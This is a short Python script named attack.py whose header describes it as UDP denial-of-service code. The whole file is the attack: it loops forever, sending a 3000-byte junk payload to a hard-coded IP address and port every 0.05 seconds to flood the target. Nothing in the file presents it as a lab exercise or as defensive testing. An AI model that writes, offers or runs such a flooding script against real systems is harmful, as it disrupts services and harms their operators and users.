import socket
import time
import os

#============================================================
# Module: attack.py
# Author: Patrick Blanchard
# Purpose: Creates dos code for udp.
# Date: November 8, 2016
#=============================================================

TARGET_IP = "10.0.0.1"
PORT = 5000

def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    mesg = "lol" * 1000
    s.sendto(mesg, (TARGET_IP, PORT))

while(True):
    attack()
    time.sleep(.05)
